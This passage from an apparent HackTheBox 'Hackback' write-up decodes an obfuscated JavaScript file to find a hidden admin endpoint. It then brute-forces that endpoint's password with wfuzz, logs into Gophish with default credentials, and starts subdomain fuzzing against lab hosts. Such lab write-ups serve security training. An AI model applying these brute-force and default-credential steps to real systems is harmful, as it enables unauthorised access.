&lt;h4 id=&quot;by-looking-at-privatejs-its-not-really-what-we-expect-a-javascript-file-to-be-&quot;&gt;By looking at &lt;code class=&quot;highlighter-rouge&quot;&gt;private.js&lt;/code&gt; it’s not really what we expect a javascript file to be :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
	ine n=['\k57\k78\k49\k6n\k77\k72\k37\k44\k75\k73\k4s\k38\k47\k73\k4o\k76\k52\k77\k42\k2o\k77\k71\k33\k44\k75\k4q\k4o\k72\k77\k72\k4p\k44\k67\k63\k4s\k69\k77\k72\k59\k31\k4o\k45\k45\k67\k47\k38\k4o\k43\k77\k71\k37\k44\k6p\k38\k4o\k33','\k41\k63\k4s\k4q\k77\k71\k76\k44\k71\k51\k67\k43\k77\k34\k2s\k43\k74\k32\k6r\k44\k74\k4q\k4o\k68\k5n\k63\k4o\k44\k77\k71\k54\k43\k70\k54\k73\k79\k77\k37\k6r\k43\k68\k73\k4s\k51\k58\k4q\k4s\k35\k57\k38\k4o\k70\k44\k73\k4s\k74\k4r\k43\k44\k44\k76\k41\k6n\k43\k67\k79\k6o\k3q','\k77\k35\k48\k44\k72\k38\k4s\k37\k64\k44\k52\k6q\k4q\k4q\k4o\k4n\k77\k34\k6n\k44\k6p\k56\k52\k6r\k77\k72\k74\k37\k77\k37\k73\k30\k77\k6s\k31\k61\k77\k37\k73\k41\k51\k73\k4o\k73\k66\k73\k4s\k45\k77\k34\k58\k44\k73\k52\k6n\k43\k6p\k4q\k4s\k77\k46\k7n\k72\k43\k6q\k7n\k70\k76\k43\k41\k6n\k43\k75\k42\k7n\k44\k73\k73\k4o\k39\k46\k38\k4s\k34\k77\k71\k5n\k6r\k57\k73\k4o\k68'];(shapgvba(p,q){ine r=shapgvba(s){juvyr(--s){p['chfu'](p['fuvsg']());}};r(++q);}(n,0k66));ine o=shapgvba(p,q){p=p-0k0;ine r=n[p];vs(o['ZfHYzi']===haqrsvarq){(shapgvba(){ine s;gel{ine t=Shapgvba('erghea\k20(shapgvba()\k20'+'{}.pbafgehpgbe(\k22erghea\k20guvf\k22)(\k20)'+');');s=t();}pngpu(u){s=jvaqbj;}ine v='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/=';s['ngbo']||(s['ngbo']=shapgvba(w){ine x=Fgevat(w)['ercynpr'](/=+$/,'');sbe(ine y=0k0,z,a,b=0k0,c='';a=x['puneNg'](b++);~a&amp;amp;&amp;amp;(z=y%0k4?z*0k40+a:a,y++%0k4)?c+=Fgevat['sebzPunePbqr'](0kss&amp;amp;z&amp;gt;&amp;gt;(-0k2*y&amp;amp;0k6)):0k0){a=v['vaqrkBs'](a);}erghea c;});}());ine d=shapgvba(e,q){ine g=[],h=0k0,i,j='',k='';e=ngbo(e);sbe(ine l=0k0,m=e['yratgu'];l&amp;lt;m;l++){k+='%'+('00'+e['punePbqrNg'](l)['gbFgevat'](0k10))['fyvpr'](-0k2);}e=qrpbqrHEVPbzcbarag(k);sbe(ine N=0k0;N&amp;lt;0k100;N++){g[N]=N;}sbe(N=0k0;N&amp;lt;0k100;N++){h=(h+g[N]+q['punePbqrNg'](N%q['yratgu']))%0k100;i=g[N];g[N]=g[h];g[h]=i;}N=0k0;h=0k0;sbe(ine O=0k0;O&amp;lt;e['yratgu'];O++){N=(N+0k1)%0k100;h=(h+g[N])%0k100;i=g[N];g[N]=g[h];g[h]=i;j+=Fgevat['sebzPunePbqr'](e['punePbqrNg'](O)^g[(g[N]+g[h])%0k100]);}erghea j;};o['BbNPpq']=d;o['dFYjTx']={};o['ZfHYzi']=!![];}ine P=o['dFYjTx'][p];vs(P===haqrsvarq){vs(o['cVwyDO']===haqrsvarq){o['cVwyDO']=!![];}r=o['BbNPpq'](r,q);o['dFYjTx'][p]=r;}ryfr{r=P;}erghea r;};ine k='\k53\k65\k63\k75\k72\k65\k20\k4p\k6s\k67\k69\k6r\k20\k42\k79\k70\k61\k73\k73';ine m=o('0k0','\k50\k5q\k53\k36');ine u=o('0k1','\k72\k37\k54\k59');ine l=o('0k2','\k44\k41\k71\k67');ine g='\k3s\k61\k63\k74\k69\k6s\k6r\k3q\k28\k73\k68\k6s\k77\k2p\k6p\k69\k73\k74\k2p\k65\k78\k65\k63\k2p\k69\k6r\k69\k74\k29';ine f='\k26\k73\k69\k74\k65\k3q\k28\k74\k77\k69\k74\k74\k65\k72\k2p\k70\k61\k79\k70\k61\k6p\k2p\k66\k61\k63\k65\k62\k6s\k6s\k6o\k2p\k68\k61\k63\k6o\k74\k68\k65\k62\k6s\k78\k29';ine v='\k26\k70\k61\k73\k73\k77\k6s\k72\k64\k3q\k2n\k2n\k2n\k2n\k2n\k2n\k2n\k2n';ine x='\k26\k73\k65\k73\k73\k69\k6s\k6r\k3q';ine j='\k4r\k6s\k74\k68\k69\k6r\k67\k20\k6q\k6s\k72\k65\k20\k74\k6s\k20\k73\k61\k79';
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;first-thing-we-notice-is-that-its-not-actually-js-ine-n--this-doesnt-look-like-js-most-likely-its-gonna-be-var-v-is-the-22nd-letter-in-alphabet-while-i-is-the-9th-22---9--13&quot;&gt;First thing we notice is that it’s not actually &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;ine n&lt;/code&gt; ? This doesn’t look like &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt;, most likely it’s gonna be &lt;code class=&quot;highlighter-rouge&quot;&gt;var&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;v&lt;/code&gt; is the 22nd letter in alphabet while &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt; is the 9th. &lt;code class=&quot;highlighter-rouge&quot;&gt;22 - 9 = 13&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;so-this-script-is-rot-13-encoded-i-used-rot13com-to-decode-it-&quot;&gt;So this script is &lt;code class=&quot;highlighter-rouge&quot;&gt;rot 13&lt;/code&gt; encoded. I used &lt;a href=&quot;https://www.rot13.com&quot;&gt;rot13.com&lt;/a&gt; to decode it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var a=['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33','\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d','\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x66));var b=function(c,d){c=c-0x0;var e=a[c];if(b['MsULmv']===undefined){(function(){var f;try{var g=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');f=g();}catch(h){f=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';f['atob']||(f['atob']=function(j){var k=String(j)['replace'](/=+$/,'');for(var l=0x0,m,n,o=0x0,p='';n=k['charAt'](o++);~n&amp;amp;&amp;amp;(m=l%0x4?m*0x40+n:n,l++%0x4)?p+=String['fromCharCode'](0xff&amp;amp;m&amp;gt;&amp;gt;(-0x2*l&amp;amp;0x6)):0x0){n=i['indexOf'](n);}return p;});}());var q=function(r,d){var t=[],u=0x0,v,w='',x='';r=atob(r);for(var y=0x0,z=r['length'];y&amp;lt;z;y++){x+='%'+('00'+r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);}r=decodeURIComponent(x);for(var A=0x0;A&amp;lt;0x100;A++){t[A]=A;}for(A=0x0;A&amp;lt;0x100;A++){u=(u+t[A]+d['charCodeAt'](A%d['length']))%0x100;v=t[A];t[A]=t[u];t[u]=v;}A=0x0;u=0x0;for(var B=0x0;B&amp;lt;r['length'];B++){A=(A+0x1)%0x100;u=(u+t[A])%0x100;v=t[A];t[A]=t[u];t[u]=v;w+=String['fromCharCode'](r['charCodeAt'](B)^t[(t[A]+t[u])%0x100]);}return w;};b['OoACcd']=q;b['qSLwGk']={};b['MsULmv']=!![];}var C=b['qSLwGk'][c];if(C===undefined){if(b['pIjlQB']===undefined){b['pIjlQB']=!![];}e=b['OoACcd'](e,d);b['qSLwGk'][c]=e;}else{e=C;}return e;};var x='\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';var z=b('0x0','\x50\x5d\x53\x36');var h=b('0x1','\x72\x37\x54\x59');var y=b('0x2','\x44\x41\x71\x67');var t='\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';var s='\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';var i='\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';var k='\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';var w='\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-this-is-better-i-also-used-a-js-beautifier-to-make-it-easily-readable-&quot;&gt;Now this is better. I also used a &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; beautifier to make it easily readable :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var a = ['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33', '\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d', '\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];
(function(c, d) {
    var e = function(f) {
        while (--f) {
            c['push'](c['shift']());
        }
    };
    e(++d);
}(a, 0x66));
var b = function(c, d) {
    c = c - 0x0;
    var e = a[c];
    if (b['MsULmv'] === undefined) {
        (function() {
            var f;
            try {
                var g = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
                f = g();
            } catch (h) {
                f = window;
            }
            var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            f['atob'] || (f['atob'] = function(j) {
                var k = String(j)['replace'](/=+$/, '');
                for (var l = 0x0, m, n, o = 0x0, p = ''; n = k['charAt'](o++); ~n &amp;amp;&amp;amp; (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String['fromCharCode'](0xff &amp;amp; m &amp;gt;&amp;gt; (-0x2 * l &amp;amp; 0x6)) : 0x0) {
                    n = i['indexOf'](n);
                }
                return p;
            });
        }());
        var q = function(r, d) {
            var t = [],
                u = 0x0,
                v, w = '',
                x = '';
            r = atob(r);
            for (var y = 0x0, z = r['length']; y &amp;lt; z; y++) {
                x += '%' + ('00' + r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);
            }
            r = decodeURIComponent(x);
            for (var A = 0x0; A &amp;lt; 0x100; A++) {
                t[A] = A;
            }
            for (A = 0x0; A &amp;lt; 0x100; A++) {
                u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 0x100;
                v = t[A];
                t[A] = t[u];
                t[u] = v;
            }
            A = 0x0;
            u = 0x0;
            for (var B = 0x0; B &amp;lt; r['length']; B++) {
                A = (A + 0x1) % 0x100;
                u = (u + t[A]) % 0x100;
                v = t[A];
                t[A] = t[u];
                t[u] = v;
                w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 0x100]);
            }
            return w;
        };
        b['OoACcd'] = q;
        b['qSLwGk'] = {};
        b['MsULmv'] = !![];
    }
    var C = b['qSLwGk'][c];
    if (C === undefined) {
        if (b['pIjlQB'] === undefined) {
            b['pIjlQB'] = !![];
        }
        e = b['OoACcd'](e, d);
        b['qSLwGk'][c] = e;
    } else {
        e = C;
    }
    return e;
};
var x = '\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';
var z = b('0x0', '\x50\x5d\x53\x36');
var h = b('0x1', '\x72\x37\x54\x59');
var y = b('0x2', '\x44\x41\x71\x67');
var t = '\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';
var s = '\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';
var i = '\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';
var k = '\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';
var w = '\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;as-you-can-see-its-still-heavily-obfuscated-i-solved-this-by-pasting-the-code-in-the-js-console-it-will-do-the-magic-happening-in-these-functions-then-we-can-just-read-the-variables-at-the-bottom-of-the-script--x-z-h-y-t-s-i-k-w&quot;&gt;As you can see it’s still heavily obfuscated, I solved this by pasting the code in the &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; console. It will do the magic happening in these functions then we can just read the variables at the bottom of the script : &lt;code class=&quot;highlighter-rouge&quot;&gt;x z h y t s i k w&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-this-message-&quot;&gt;We got this message :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Secure Login Bypass
Remember the secret path is
2bb6916122f1da34dcd916421e531578
Just in case I loose access to the admin panel
?action=(show,list,exec,init)
&amp;amp;site=(twitter,paypal,facebook,hackthebox)
&amp;amp;password=*****
&amp;amp;session=
Nothing more to say
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;going-to-that-path-only-caused-a-redirect-so-we-need-to-enumerate-more&quot;&gt;Going to that path only caused a redirect, so we need to enumerate more.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;accessing-the-secret-path&quot;&gt;Accessing the Secret Path&lt;/h3&gt;
&lt;h4 id=&quot;from-the-secret-message-we-know-what-parameters-its-expecting-us-to-send--actionsitepasswordsession-this-is-probably-gonna-be-a-php-page-so-i-ran-gobuster-on-that-path-with-the-same-wordlist-i-used-before-and-php-extension-&quot;&gt;From the secret message we know what parameters it’s expecting us to send : (&lt;code class=&quot;highlighter-rouge&quot;&gt;?action=&amp;amp;site=&amp;amp;password=&amp;amp;session=&lt;/code&gt;). This is probably gonna be a &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; page. So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on that path with the same wordlist I used before and &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirb/common.txt -x php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/07/05 10:08:09 Starting gobuster
=====================================================
/webadmin.php (Status: 302)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-we-got-webadminphp-i-tried-again-and-now-i-didnt-get-a-redirect-&quot;&gt;Great we got &lt;code class=&quot;highlighter-rouge&quot;&gt;webadmin.php&lt;/code&gt;, I tried again and now I didn’t get a redirect :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=test&amp;amp;session='
Wrong secret key!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-i-got-wrong-secret-key-and-thats-expected-because-i-set-the-password-to-test-i-used-wfuzz-again-with-darkweb2017-top10000txt-from-seclists-to-bruteforce-the-password-which-happened-to-be-a-very-easy-one-&quot;&gt;But I got &lt;code class=&quot;highlighter-rouge&quot;&gt;Wrong secret key!&lt;/code&gt;, and that’s expected because I set the password to &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; again with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt&quot;&gt;darkweb2017-top10000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; to bruteforce the password which happened to be a very easy one :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -u 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=FUZZ&amp;amp;session=' -w darkweb2017-top10000.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=FUZZ&amp;amp;session=
Total requests: 10000

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=302      0 L        3 W           17 Ch        &quot;123456&quot;
000004:  C=302      0 L        3 W           17 Ch        &quot;password&quot;
000006:  C=302      0 L        3 W           17 Ch        &quot;abc123&quot;
000005:  C=302      0 L        3 W           17 Ch        &quot;qwerty&quot;
000007:  C=302      7 L       15 W          197 Ch        &quot;12345678&quot;
000008:  C=302      0 L        3 W           17 Ch        &quot;password1&quot;
000009:  C=302      0 L        3 W           17 Ch        &quot;1234567&quot;
000010:  C=302      0 L        3 W           17 Ch        &quot;123123&quot;
000002:  C=302      0 L        3 W           17 Ch        &quot;123456789&quot;
000003:  C=302      0 L        3 W           17 Ch        &quot;111111&quot;
000011:  C=302      0 L        3 W           17 Ch        &quot;1234567890&quot;
000012:  C=302      0 L        3 W           17 Ch        &quot;000000&quot;
000013:  C=302      0 L        3 W           17 Ch        &quot;12345&quot;
^C
Finishing pending requests...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;12345678-gave-a-different-response-length-so-its-probably-the-password-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;12345678&lt;/code&gt; gave a different response length so it’s probably the password :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session='
Array
(
    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; 7cb114055494cb503306a0edd1ad1d398f6fb18e28a7a62883c24fd8ab34f66b.log
    [3] =&amp;gt; e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;yes-it-worked-i-added-my-phpsessid-cookie-with-the--b-option-and-i-also-added-it-to-session-because-some-stuff-didnt-work-without-including-the-session-cookie&quot;&gt;Yes it worked. I added my &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; cookie with the &lt;code class=&quot;highlighter-rouge&quot;&gt;-b&lt;/code&gt; option and I also added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;session=&lt;/code&gt;, because some stuff didn’t work without including the session cookie.&lt;/h4&gt;
&lt;h4 id=&quot;list-showed-us-some-logs-i-tried-the-other-actions-exec-said-missing-command-but-i-couldnt-make-it-execute-anything-init-didnt-output-anything-but-most-likely-its-doing-something-that-doesnt-produce-an-output-also-show-didnt-result-in-any-output-but-we-will-make-it-do-soon&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;list&lt;/code&gt; showed us some logs. I tried the other actions, &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; said &lt;code class=&quot;highlighter-rouge&quot;&gt;Missing command&lt;/code&gt; but I couldn’t make it execute anything. &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; didn’t output anything but most likely it’s doing something that doesn’t produce an output. Also &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt; didn’t result in any output but we will make it do soon.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gophish&quot;&gt;Gophish&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-full-nmap-scan-&quot;&gt;Let’s take a look at the full &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -T5 -p- hackback.htb --max-retries 1 &lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-another-3rd-port--64831-i-scanned-that-port-with-nmap-&quot;&gt;There’s another 3rd port : &lt;code class=&quot;highlighter-rouge&quot;&gt;64831&lt;/code&gt;. I scanned that port with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC -p 64831 hackback.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-https-i-went-there-and-it-was-gophish-&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;. I went there and it was &lt;code class=&quot;highlighter-rouge&quot;&gt;gophish&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Gophish is a powerful, open-source phishing framework that makes it easy to test your organization’s exposure to phishing. -&lt;a href=&quot;https://getgophish.com/&quot;&gt;getgophish.com&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-tried-to-login-with-the-default-credentials--admin--gophish-and-it-worked-&quot;&gt;I tried to login with the default credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;admin : gophish&lt;/code&gt; and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-kinda-empty-but-i-found-some-email-templates-for-facebook-hackthebox-paypal-and-twitter&quot;&gt;It was kinda empty but I found some email templates for Facebook, HackTheBox, PayPal and Twitter.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-there-are-phishing-sites-somewhere-for-these-sites-and-now-we-can-understand-whats-happening-in-the-secret-path-its-an-endpoint-that-shows-the-collected-data-from-the-phishing-sites-i-created-a-small-list-to-search-for-hackthebox-phishing-site-&quot;&gt;So there are phishing sites somewhere for these sites and now we can understand what’s happening in the secret path. It’s an endpoint that shows the collected data from the phishing sites. I created a small list to search for HackTheBox phishing site :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hackthebox
hacktheboxeu
hackthebox.eu
htb
www.hackthebox
www.hacktheboxeu
www.hackthebox.eu
www.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-used-wfuzz-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -c -w list.txt -H &quot;HOST: FUZZ.htb&quot; http://10.10.10.128

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

*****
* Wfuzz 2.3.4 - The Web Fuzzer                         *
*****

Target: http://10.10.10.128/
Total requests: 9

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

